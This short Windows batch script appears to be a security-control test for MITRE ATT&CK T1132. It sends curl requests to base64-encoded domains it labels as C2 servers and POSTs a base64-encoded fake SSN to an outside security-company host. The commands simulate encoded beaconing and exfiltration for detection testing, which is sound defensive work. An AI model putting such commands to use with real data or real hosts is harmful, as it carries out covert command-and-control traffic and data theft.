@ECHO OFF

ECHO ===========================================================================
ECHO Data Encoding - T1132
ECHO Command and control (C2) information is encoded using a standard data encoding system.

ECHO C2: msupdater.com base64 encoded
"%CURL%" -s -o /dev/null -I -w "Result: %%{http_code}\n" -m3 bXN1cGRhdGVy.com
ECHO C2: twitterdocs.com base64 encoded
"%CURL%" -s -o /dev/null -I -w "Result: %%{http_code}\n" -m3 dHdpdHRlcmRvY3M=.com
ECHO C2: base64 encoded fake SSN (111-11-1111) to destination url SafekeepCybersecurity
"%CURL%" -XPOST MTExLTExLTExMTE=.safekeepsecurity.com
